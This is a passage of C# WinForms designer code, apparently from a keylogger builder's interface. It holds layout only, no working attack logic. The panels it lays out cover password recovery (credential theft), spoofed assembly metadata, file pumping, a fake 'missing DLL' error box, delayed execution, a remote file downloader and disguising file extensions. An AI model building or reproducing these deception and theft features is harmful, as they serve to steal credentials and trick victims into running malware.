            this.lblDescriptionAsm.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDescriptionAsm.Location = new System.Drawing.Point(22, 132);
            this.lblDescriptionAsm.Name = "lblDescriptionAsm";
            this.lblDescriptionAsm.Size = new System.Drawing.Size(88, 20);
            this.lblDescriptionAsm.TabIndex = 29;
            this.lblDescriptionAsm.Text = "Description:";
            // 
            // lblTitle
            // 
            this.lblTitle.AutoSize = true;
            this.lblTitle.BackColor = System.Drawing.Color.Transparent;
            this.lblTitle.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblTitle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblTitle.Location = new System.Drawing.Point(22, 95);
            this.lblTitle.Name = "lblTitle";
            this.lblTitle.Size = new System.Drawing.Size(41, 20);
            this.lblTitle.TabIndex = 28;
            this.lblTitle.Text = "Title:";
            // 
            // tbVersion
            // 
            this.tbVersion.BackColor = System.Drawing.Color.Transparent;
            this.tbVersion.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbVersion.ForeColor = System.Drawing.Color.DimGray;
            this.tbVersion.Location = new System.Drawing.Point(121, 272);
            this.tbVersion.MaxLength = 32767;
            this.tbVersion.Multiline = false;
            this.tbVersion.Name = "tbVersion";
            this.tbVersion.ReadOnly = false;
            this.tbVersion.Size = new System.Drawing.Size(351, 28);
            this.tbVersion.TabIndex = 27;
            this.tbVersion.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbVersion.UseSystemPasswordChar = false;
            // 
            // tbCopyright
            // 
            this.tbCopyright.BackColor = System.Drawing.Color.Transparent;
            this.tbCopyright.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbCopyright.ForeColor = System.Drawing.Color.DimGray;
            this.tbCopyright.Location = new System.Drawing.Point(121, 235);
            this.tbCopyright.MaxLength = 32767;
            this.tbCopyright.Multiline = false;
            this.tbCopyright.Name = "tbCopyright";
            this.tbCopyright.ReadOnly = false;
            this.tbCopyright.Size = new System.Drawing.Size(351, 28);
            this.tbCopyright.TabIndex = 26;
            this.tbCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbCopyright.UseSystemPasswordChar = false;
            // 
            // tbProduct
            // 
            this.tbProduct.BackColor = System.Drawing.Color.Transparent;
            this.tbProduct.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbProduct.ForeColor = System.Drawing.Color.DimGray;
            this.tbProduct.Location = new System.Drawing.Point(121, 198);
            this.tbProduct.MaxLength = 32767;
            this.tbProduct.Multiline = false;
            this.tbProduct.Name = "tbProduct";
            this.tbProduct.ReadOnly = false;
            this.tbProduct.Size = new System.Drawing.Size(351, 28);
            this.tbProduct.TabIndex = 25;
            this.tbProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbProduct.UseSystemPasswordChar = false;
            // 
            // tbCompany
            // 
            this.tbCompany.BackColor = System.Drawing.Color.Transparent;
            this.tbCompany.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbCompany.ForeColor = System.Drawing.Color.DimGray;
            this.tbCompany.Location = new System.Drawing.Point(121, 161);
            this.tbCompany.MaxLength = 32767;
            this.tbCompany.Multiline = false;
            this.tbCompany.Name = "tbCompany";
            this.tbCompany.ReadOnly = false;
            this.tbCompany.Size = new System.Drawing.Size(351, 28);
            this.tbCompany.TabIndex = 24;
            this.tbCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbCompany.UseSystemPasswordChar = false;
            // 
            // tbDescription
            // 
            this.tbDescription.BackColor = System.Drawing.Color.Transparent;
            this.tbDescription.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbDescription.ForeColor = System.Drawing.Color.DimGray;
            this.tbDescription.Location = new System.Drawing.Point(121, 124);
            this.tbDescription.MaxLength = 32767;
            this.tbDescription.Multiline = false;
            this.tbDescription.Name = "tbDescription";
            this.tbDescription.ReadOnly = false;
            this.tbDescription.Size = new System.Drawing.Size(351, 28);
            this.tbDescription.TabIndex = 23;
            this.tbDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbDescription.UseSystemPasswordChar = false;
            // 
            // tbTitle
            // 
            this.tbTitle.BackColor = System.Drawing.Color.Transparent;
            this.tbTitle.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbTitle.ForeColor = System.Drawing.Color.DimGray;
            this.tbTitle.Location = new System.Drawing.Point(121, 87);
            this.tbTitle.MaxLength = 32767;
            this.tbTitle.Multiline = false;
            this.tbTitle.Name = "tbTitle";
            this.tbTitle.ReadOnly = false;
            this.tbTitle.Size = new System.Drawing.Size(351, 28);
            this.tbTitle.TabIndex = 22;
            this.tbTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbTitle.UseSystemPasswordChar = false;
            // 
            // cbChangeAssembly
            // 
            this.cbChangeAssembly.BackColor = System.Drawing.Color.Transparent;
            this.cbChangeAssembly.Checked = false;
            this.cbChangeAssembly.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbChangeAssembly.Location = new System.Drawing.Point(26, 53);
            this.cbChangeAssembly.Name = "cbChangeAssembly";
            this.cbChangeAssembly.Size = new System.Drawing.Size(149, 19);
            this.cbChangeAssembly.TabIndex = 21;
            this.cbChangeAssembly.Text = "Change Assembly";
            // 
            // separator6
            // 
            this.separator6.Location = new System.Drawing.Point(26, 37);
            this.separator6.Name = "separator6";
            this.separator6.Size = new System.Drawing.Size(446, 10);
            this.separator6.TabIndex = 20;
            this.separator6.Text = "ambiance_Separator9";
            // 
            // lblAssembly
            // 
            this.lblAssembly.AutoSize = true;
            this.lblAssembly.BackColor = System.Drawing.Color.Transparent;
            this.lblAssembly.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblAssembly.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblAssembly.Location = new System.Drawing.Point(24, 15);
            this.lblAssembly.Name = "lblAssembly";
            this.lblAssembly.Size = new System.Drawing.Size(77, 20);
            this.lblAssembly.TabIndex = 19;
            this.lblAssembly.Text = "Assembly";
            // 
            // panelSystemCure
            // 
            this.panelSystemCure.Controls.Add(this.lblVaccineLog);
            this.panelSystemCure.Controls.Add(this.lbVaccineLog);
            this.panelSystemCure.Controls.Add(this.btnRemoveKeylogger);
            this.panelSystemCure.Controls.Add(this.separator8);
            this.panelSystemCure.Controls.Add(this.lblVaccine);
            this.panelSystemCure.Controls.Add(this.lblVaccineInfo);
            this.panelSystemCure.Location = new System.Drawing.Point(245, 39);
            this.panelSystemCure.Name = "panelSystemCure";
            this.panelSystemCure.Size = new System.Drawing.Size(498, 435);
            this.panelSystemCure.TabIndex = 24;
            this.panelSystemCure.Visible = false;
            // 
            // lblVaccineLog
            // 
            this.lblVaccineLog.AutoSize = true;
            this.lblVaccineLog.BackColor = System.Drawing.Color.Transparent;
            this.lblVaccineLog.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblVaccineLog.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVaccineLog.Location = new System.Drawing.Point(179, 120);
            this.lblVaccineLog.Name = "lblVaccineLog";
            this.lblVaccineLog.Size = new System.Drawing.Size(98, 20);
            this.lblVaccineLog.TabIndex = 14;
            this.lblVaccineLog.Text = "[- Cure Log -]";
            // 
            // lbVaccineLog
            // 
            this.lbVaccineLog.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.lbVaccineLog.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
            this.lbVaccineLog.FormattingEnabled = true;
            this.lbVaccineLog.IntegralHeight = false;
            this.lbVaccineLog.ItemHeight = 18;
            this.lbVaccineLog.Location = new System.Drawing.Point(14, 153);
            this.lbVaccineLog.Name = "lbVaccineLog";
            this.lbVaccineLog.Size = new System.Drawing.Size(451, 223);
            this.lbVaccineLog.TabIndex = 9;
            // 
            // btnRemoveKeylogger
            // 
            this.btnRemoveKeylogger.BackColor = System.Drawing.Color.Transparent;
            this.btnRemoveKeylogger.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnRemoveKeylogger.Image = null;
            this.btnRemoveKeylogger.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnRemoveKeylogger.Location = new System.Drawing.Point(14, 382);
            this.btnRemoveKeylogger.Name = "btnRemoveKeylogger";
            this.btnRemoveKeylogger.Size = new System.Drawing.Size(451, 30);
            this.btnRemoveKeylogger.TabIndex = 13;
            this.btnRemoveKeylogger.Text = "Scan";
            this.btnRemoveKeylogger.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnRemoveKeylogger.Click += new System.EventHandler(this.btnRemoveKeylogger_Click);
            // 
            // separator8
            // 
            this.separator8.Location = new System.Drawing.Point(19, 34);
            this.separator8.Name = "separator8";
            this.separator8.Size = new System.Drawing.Size(446, 10);
            this.separator8.TabIndex = 11;
            this.separator8.Text = "ambiance_Separator7";
            // 
            // lblVaccine
            // 
            this.lblVaccine.AutoSize = true;
            this.lblVaccine.BackColor = System.Drawing.Color.Transparent;
            this.lblVaccine.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblVaccine.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVaccine.Location = new System.Drawing.Point(24, 15);
            this.lblVaccine.Name = "lblVaccine";
            this.lblVaccine.Size = new System.Drawing.Size(96, 20);
            this.lblVaccine.TabIndex = 10;
            this.lblVaccine.Text = "System Cure";
            // 
            // lblVaccineInfo
            // 
            this.lblVaccineInfo.AutoSize = true;
            this.lblVaccineInfo.BackColor = System.Drawing.Color.Transparent;
            this.lblVaccineInfo.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblVaccineInfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVaccineInfo.Location = new System.Drawing.Point(10, 47);
            this.lblVaccineInfo.Name = "lblVaccineInfo";
            this.lblVaccineInfo.Size = new System.Drawing.Size(479, 60);
            this.lblVaccineInfo.TabIndex = 12;
            this.lblVaccineInfo.Text = "If the file was encrypted, this will most likely fail. However, other than \r\nthat" +
    ", this vaccine should find and terminate the keylogger. If it does not\r\nwork, th" +
    "en just contact Venomous Net.";
            // 
            // panelFilePumper
            // 
            this.panelFilePumper.Controls.Add(this.cmdDoPumpFile);
            this.panelFilePumper.Controls.Add(this.cmdSelectFileToPump);
            this.panelFilePumper.Controls.Add(this.labelSize);
            this.panelFilePumper.Controls.Add(this.textBoxPumpSize);
            this.panelFilePumper.Controls.Add(this.labelPumpFilePath);
            this.panelFilePumper.Controls.Add(this.ambiance_Separator1);
            this.panelFilePumper.Controls.Add(this.ambiance_HeaderLabel5);
            this.panelFilePumper.Location = new System.Drawing.Point(245, 42);
            this.panelFilePumper.Name = "panelFilePumper";
            this.panelFilePumper.Size = new System.Drawing.Size(498, 435);
            this.panelFilePumper.TabIndex = 22;
            this.panelFilePumper.Visible = false;
            // 
            // cmdDoPumpFile
            // 
            this.cmdDoPumpFile.Location = new System.Drawing.Point(245, 109);
            this.cmdDoPumpFile.Name = "cmdDoPumpFile";
            this.cmdDoPumpFile.Size = new System.Drawing.Size(75, 23);
            this.cmdDoPumpFile.TabIndex = 12;
            this.cmdDoPumpFile.Text = "Pump";
            this.cmdDoPumpFile.Click += new System.EventHandler(this.cmdDoPumpFile_Click);
            // 
            // cmdSelectFileToPump
            // 
            this.cmdSelectFileToPump.Location = new System.Drawing.Point(245, 84);
            this.cmdSelectFileToPump.Name = "cmdSelectFileToPump";
            this.cmdSelectFileToPump.Size = new System.Drawing.Size(75, 23);
            this.cmdSelectFileToPump.TabIndex = 0;
            this.cmdSelectFileToPump.Text = "Select File";
            this.cmdSelectFileToPump.Click += new System.EventHandler(this.cmdSelectFileToPump_Click);
            // 
            // labelSize
            // 
            this.labelSize.Font = new System.Drawing.Font("Verdana", 7F);
            this.labelSize.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.labelSize.Location = new System.Drawing.Point(21, 109);
            this.labelSize.Name = "labelSize";
            this.labelSize.Size = new System.Drawing.Size(91, 16);
            this.labelSize.TabIndex = 1;
            this.labelSize.Text = "Size (in bytes): ";
            // 
            // textBoxPumpSize
            // 
            this.textBoxPumpSize.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.textBoxPumpSize.Font = new System.Drawing.Font("Verdana", 7F);
            this.textBoxPumpSize.Location = new System.Drawing.Point(118, 104);
            this.textBoxPumpSize.MaxLength = 32767;
            this.textBoxPumpSize.Multiline = false;
            this.textBoxPumpSize.Name = "textBoxPumpSize";
            this.textBoxPumpSize.ReadOnly = false;
            this.textBoxPumpSize.Size = new System.Drawing.Size(100, 23);
            this.textBoxPumpSize.TabIndex = 3;
            this.textBoxPumpSize.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.textBoxPumpSize.UseSystemPasswordChar = false;
            // 
            // labelPumpFilePath
            // 
            this.labelPumpFilePath.AutoSize = true;
            this.labelPumpFilePath.Font = new System.Drawing.Font("Verdana", 7F);
            this.labelPumpFilePath.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.labelPumpFilePath.Location = new System.Drawing.Point(21, 84);
            this.labelPumpFilePath.Name = "labelPumpFilePath";
            this.labelPumpFilePath.Size = new System.Drawing.Size(39, 12);
            this.labelPumpFilePath.TabIndex = 11;
            this.labelPumpFilePath.Text = "Path :";
            // 
            // ambiance_Separator1
            // 
            this.ambiance_Separator1.Location = new System.Drawing.Point(24, 31);
            this.ambiance_Separator1.Name = "ambiance_Separator1";
            this.ambiance_Separator1.Size = new System.Drawing.Size(446, 10);
            this.ambiance_Separator1.TabIndex = 10;
            this.ambiance_Separator1.Text = "ambiance_Separator8";
            // 
            // ambiance_HeaderLabel5
            // 
            this.ambiance_HeaderLabel5.AutoSize = true;
            this.ambiance_HeaderLabel5.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel5.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel5.Location = new System.Drawing.Point(20, 12);
            this.ambiance_HeaderLabel5.Name = "ambiance_HeaderLabel5";
            this.ambiance_HeaderLabel5.Size = new System.Drawing.Size(92, 20);
            this.ambiance_HeaderLabel5.TabIndex = 9;
            this.ambiance_HeaderLabel5.Text = "File Pumper";
            // 
            // panelPasswordRecovery
            // 
            this.panelPasswordRecovery.Controls.Add(this.lvPasswordRecovery);
            this.panelPasswordRecovery.Controls.Add(this.cbPasswordRecovery);
            this.panelPasswordRecovery.Controls.Add(this.separator5);
            this.panelPasswordRecovery.Controls.Add(this.lblPasswordRecovery);
            this.panelPasswordRecovery.Location = new System.Drawing.Point(239, 48);
            this.panelPasswordRecovery.Name = "panelPasswordRecovery";
            this.panelPasswordRecovery.Size = new System.Drawing.Size(498, 435);
            this.panelPasswordRecovery.TabIndex = 26;
            this.panelPasswordRecovery.Visible = false;
            // 
            // lvPasswordRecovery
            // 
            this.lvPasswordRecovery.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.chSoftware,
            this.chVersions});
            this.lvPasswordRecovery.FullRowSelect = true;
            this.lvPasswordRecovery.GridLines = true;
            this.lvPasswordRecovery.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
            this.lvPasswordRecovery.Location = new System.Drawing.Point(26, 64);
            this.lvPasswordRecovery.Name = "lvPasswordRecovery";
            this.lvPasswordRecovery.Size = new System.Drawing.Size(446, 348);
            this.lvPasswordRecovery.TabIndex = 12;
            this.lvPasswordRecovery.UseCompatibleStateImageBehavior = false;
            this.lvPasswordRecovery.View = System.Windows.Forms.View.Details;
            // 
            // chSoftware
            // 
            this.chSoftware.Text = "Software";
            this.chSoftware.Width = 210;
            // 
            // chVersions
            // 
            this.chVersions.Text = "Versions";
            this.chVersions.Width = 230;
            // 
            // cbPasswordRecovery
            // 
            this.cbPasswordRecovery.Location = new System.Drawing.Point(26, 18);
            this.cbPasswordRecovery.Name = "cbPasswordRecovery";
            this.cbPasswordRecovery.Size = new System.Drawing.Size(79, 27);
            this.cbPasswordRecovery.TabIndex = 11;
            this.cbPasswordRecovery.Text = "ambiance_Toggle2";
            this.cbPasswordRecovery.Toggled = false;
            this.cbPasswordRecovery.Type = Ambiance_Toggle._Type.OnOff;
            // 
            // separator5
            // 
            this.separator5.Location = new System.Drawing.Point(26, 47);
            this.separator5.Name = "separator5";
            this.separator5.Size = new System.Drawing.Size(446, 10);
            this.separator5.TabIndex = 10;
            this.separator5.Text = "ambiance_Separator5";
            // 
            // lblPasswordRecovery
            // 
            this.lblPasswordRecovery.AutoSize = true;
            this.lblPasswordRecovery.BackColor = System.Drawing.Color.Transparent;
            this.lblPasswordRecovery.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblPasswordRecovery.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblPasswordRecovery.Location = new System.Drawing.Point(113, 21);
            this.lblPasswordRecovery.Name = "lblPasswordRecovery";
            this.lblPasswordRecovery.Size = new System.Drawing.Size(145, 20);
            this.lblPasswordRecovery.TabIndex = 9;
            this.lblPasswordRecovery.Text = "Password Recovery";
            // 
            // panelMiscellaneous
            // 
            this.panelMiscellaneous.Controls.Add(this.lblDelayExecution);
            this.panelMiscellaneous.Controls.Add(this.nudDelayExecution);
            this.panelMiscellaneous.Controls.Add(this.cbDelayExecution);
            this.panelMiscellaneous.Controls.Add(this.tbMessageBoxBody);
            this.panelMiscellaneous.Controls.Add(this.comboBoxMessageBoxType);
            this.panelMiscellaneous.Controls.Add(this.lblMessageBoxType);
            this.panelMiscellaneous.Controls.Add(this.cbMessageBox);
            this.panelMiscellaneous.Controls.Add(this.tbMessageBoxTitle);
            this.panelMiscellaneous.Controls.Add(this.comboBoxFileType);
            this.panelMiscellaneous.Controls.Add(this.lblFileType);
            this.panelMiscellaneous.Controls.Add(this.cbFileDownloader);
            this.panelMiscellaneous.Controls.Add(this.tbFileDownloader);
            this.panelMiscellaneous.Controls.Add(this.separator4);
            this.panelMiscellaneous.Controls.Add(this.lblMiscellaneousSettings);
            this.panelMiscellaneous.Location = new System.Drawing.Point(239, 42);
            this.panelMiscellaneous.Name = "panelMiscellaneous";
            this.panelMiscellaneous.Size = new System.Drawing.Size(498, 435);
            this.panelMiscellaneous.TabIndex = 28;
            this.panelMiscellaneous.Visible = false;
            // 
            // lblDelayExecution
            // 
            this.lblDelayExecution.AutoSize = true;
            this.lblDelayExecution.BackColor = System.Drawing.Color.Transparent;
            this.lblDelayExecution.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblDelayExecution.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDelayExecution.Location = new System.Drawing.Point(324, 263);
            this.lblDelayExecution.Name = "lblDelayExecution";
            this.lblDelayExecution.Size = new System.Drawing.Size(74, 20);
            this.lblDelayExecution.TabIndex = 31;
            this.lblDelayExecution.Text = "(Seconds)";
            // 
            // nudDelayExecution
            // 
            this.nudDelayExecution.BackColor = System.Drawing.Color.Transparent;
            this.nudDelayExecution.Font = new System.Drawing.Font("Tahoma", 11F);
            this.nudDelayExecution.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(76)))));
            this.nudDelayExecution.Location = new System.Drawing.Point(181, 261);
            this.nudDelayExecution.Maximum = ((long)(100));
            this.nudDelayExecution.Minimum = ((long)(0));
            this.nudDelayExecution.MinimumSize = new System.Drawing.Size(93, 28);
            this.nudDelayExecution.Name = "nudDelayExecution";
            this.nudDelayExecution.Size = new System.Drawing.Size(127, 28);
            this.nudDelayExecution.TabIndex = 30;
            this.nudDelayExecution.Text = "ambiance_NumericUpDown2";
            this.nudDelayExecution.TextAlignment = Ambiance_NumericUpDown._TextAlignment.Near;
            this.nudDelayExecution.Value = ((long)(5));
            // 
            // cbDelayExecution
            // 
            this.cbDelayExecution.BackColor = System.Drawing.Color.Transparent;
            this.cbDelayExecution.Checked = false;
            this.cbDelayExecution.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbDelayExecution.Location = new System.Drawing.Point(28, 268);
            this.cbDelayExecution.Name = "cbDelayExecution";
            this.cbDelayExecution.Size = new System.Drawing.Size(171, 19);
            this.cbDelayExecution.TabIndex = 29;
            this.cbDelayExecution.Text = "Delay Execution";
            // 
            // tbMessageBoxBody
            // 
            this.tbMessageBoxBody.BackColor = System.Drawing.Color.Transparent;
            this.tbMessageBoxBody.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbMessageBoxBody.ForeColor = System.Drawing.Color.DimGray;
            this.tbMessageBoxBody.Location = new System.Drawing.Point(28, 193);
            this.tbMessageBoxBody.MaxLength = 32767;
            this.tbMessageBoxBody.Multiline = true;
            this.tbMessageBoxBody.Name = "tbMessageBoxBody";
            this.tbMessageBoxBody.ReadOnly = false;
            this.tbMessageBoxBody.Size = new System.Drawing.Size(437, 60);
            this.tbMessageBoxBody.TabIndex = 28;
            this.tbMessageBoxBody.Text = "The program can\'t start because nspr4.dll is missing from your computer. Try rein" +
    "stalling the program to fix this problem.";
            this.tbMessageBoxBody.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbMessageBoxBody.UseSystemPasswordChar = false;
            // 
            // comboBoxMessageBoxType
            // 
            this.comboBoxMessageBoxType.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.comboBoxMessageBoxType.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxMessageBoxType.DropDownHeight = 100;
            this.comboBoxMessageBoxType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxMessageBoxType.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxMessageBoxType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(142)))), ((int)(((byte)(142)))));
            this.comboBoxMessageBoxType.FormattingEnabled = true;
            this.comboBoxMessageBoxType.HoverSelectionColor = System.Drawing.Color.Empty;
            this.comboBoxMessageBoxType.IntegralHeight = false;
            this.comboBoxMessageBoxType.ItemHeight = 20;
            this.comboBoxMessageBoxType.Items.AddRange(new object[] {
            "Error",
            "Warning",
            "Information"});
            this.comboBoxMessageBoxType.Location = new System.Drawing.Point(270, 159);
            this.comboBoxMessageBoxType.Name = "comboBoxMessageBoxType";
            this.comboBoxMessageBoxType.Size = new System.Drawing.Size(195, 26);
            this.comboBoxMessageBoxType.StartIndex = 0;
            this.comboBoxMessageBoxType.TabIndex = 27;
            // 
            // lblMessageBoxType
            // 
            this.lblMessageBoxType.AutoSize = true;
            this.lblMessageBoxType.BackColor = System.Drawing.Color.Transparent;
            this.lblMessageBoxType.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblMessageBoxType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblMessageBoxType.Location = new System.Drawing.Point(317, 132);
            this.lblMessageBoxType.Name = "lblMessageBoxType";
            this.lblMessageBoxType.Size = new System.Drawing.Size(103, 20);
            this.lblMessageBoxType.TabIndex = 26;
            this.lblMessageBoxType.Text = "Message Type";
            // 
            // cbMessageBox
            // 
            this.cbMessageBox.BackColor = System.Drawing.Color.Transparent;
            this.cbMessageBox.Checked = false;
            this.cbMessageBox.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbMessageBox.Location = new System.Drawing.Point(28, 134);
            this.cbMessageBox.Name = "cbMessageBox";
            this.cbMessageBox.Size = new System.Drawing.Size(171, 19);
            this.cbMessageBox.TabIndex = 25;
            this.cbMessageBox.Text = "Fake Message Box";
            // 
            // tbMessageBoxTitle
            // 
            this.tbMessageBoxTitle.BackColor = System.Drawing.Color.Transparent;
            this.tbMessageBoxTitle.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbMessageBoxTitle.ForeColor = System.Drawing.Color.DimGray;
            this.tbMessageBoxTitle.Location = new System.Drawing.Point(28, 159);
            this.tbMessageBoxTitle.MaxLength = 32767;
            this.tbMessageBoxTitle.Multiline = false;
            this.tbMessageBoxTitle.Name = "tbMessageBoxTitle";
            this.tbMessageBoxTitle.ReadOnly = false;
            this.tbMessageBoxTitle.Size = new System.Drawing.Size(236, 28);
            this.tbMessageBoxTitle.TabIndex = 24;
            this.tbMessageBoxTitle.Text = "Application Error";
            this.tbMessageBoxTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbMessageBoxTitle.UseSystemPasswordChar = false;
            // 
            // comboBoxFileType
            // 
            this.comboBoxFileType.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(246)))), ((int)(((byte)(246)))), ((int)(((byte)(246)))));
            this.comboBoxFileType.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxFileType.DropDownHeight = 100;
            this.comboBoxFileType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxFileType.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxFileType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(142)))), ((int)(((byte)(142)))));
            this.comboBoxFileType.FormattingEnabled = true;
            this.comboBoxFileType.HoverSelectionColor = System.Drawing.Color.Empty;
            this.comboBoxFileType.IntegralHeight = false;
            this.comboBoxFileType.ItemHeight = 20;
            this.comboBoxFileType.Items.AddRange(new object[] {
            ".exe",
            ".scr",
            ".com",
            ".pif",
            ".bat",
            ".cmd",
            ".vbs",
            ".jpg",
            ".png",
            ".gif",
            ".mp3",
            ".mp4",
            ".avi"});
            this.comboBoxFileType.Location = new System.Drawing.Point(270, 86);
            this.comboBoxFileType.Name = "comboBoxFileType";
            this.comboBoxFileType.Size = new System.Drawing.Size(195, 26);
            this.comboBoxFileType.StartIndex = 0;
            this.comboBoxFileType.TabIndex = 23;
            // 
            // lblFileType
            // 
            this.lblFileType.AutoSize = true;
            this.lblFileType.BackColor = System.Drawing.Color.Transparent;
            this.lblFileType.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblFileType.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblFileType.Location = new System.Drawing.Point(329, 59);
            this.lblFileType.Name = "lblFileType";
            this.lblFileType.Size = new System.Drawing.Size(68, 20);
            this.lblFileType.TabIndex = 22;
            this.lblFileType.Text = "File Type";
            // 
            // cbFileDownloader
            // 
            this.cbFileDownloader.BackColor = System.Drawing.Color.Transparent;
            this.cbFileDownloader.Checked = false;
            this.cbFileDownloader.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbFileDownloader.Location = new System.Drawing.Point(28, 61);
            this.cbFileDownloader.Name = "cbFileDownloader";
            this.cbFileDownloader.Size = new System.Drawing.Size(171, 19);
            this.cbFileDownloader.TabIndex = 21;
            this.cbFileDownloader.Text = "File Downloader";
            // 
            // tbFileDownloader
            // 
            this.tbFileDownloader.BackColor = System.Drawing.Color.Transparent;
            this.tbFileDownloader.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFileDownloader.ForeColor = System.Drawing.Color.DimGray;
            this.tbFileDownloader.Location = new System.Drawing.Point(28, 86);
            this.tbFileDownloader.MaxLength = 32767;
            this.tbFileDownloader.Multiline = false;
            this.tbFileDownloader.Name = "tbFileDownloader";
            this.tbFileDownloader.ReadOnly = false;
            this.tbFileDownloader.Size = new System.Drawing.Size(236, 28);
            this.tbFileDownloader.TabIndex = 20;
            this.tbFileDownloader.Text = "http://www.example.com/file.exe";
            this.tbFileDownloader.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFileDownloader.UseSystemPasswordChar = false;
            // 
            // separator4
            // 
            this.separator4.Location = new System.Drawing.Point(28, 38);
            this.separator4.Name = "separator4";
            this.separator4.Size = new System.Drawing.Size(446, 10);
            this.separator4.TabIndex = 19;
            this.separator4.Text = "ambiance_Separator4";
            // 
            // lblMiscellaneousSettings
            // 
            this.lblMiscellaneousSettings.AutoSize = true;
            this.lblMiscellaneousSettings.BackColor = System.Drawing.Color.Transparent;
            this.lblMiscellaneousSettings.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblMiscellaneousSettings.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblMiscellaneousSettings.Location = new System.Drawing.Point(24, 19);
            this.lblMiscellaneousSettings.Name = "lblMiscellaneousSettings";
            this.lblMiscellaneousSettings.Size = new System.Drawing.Size(168, 20);
            this.lblMiscellaneousSettings.TabIndex = 18;
            this.lblMiscellaneousSettings.Text = "Miscellaneous Settings";
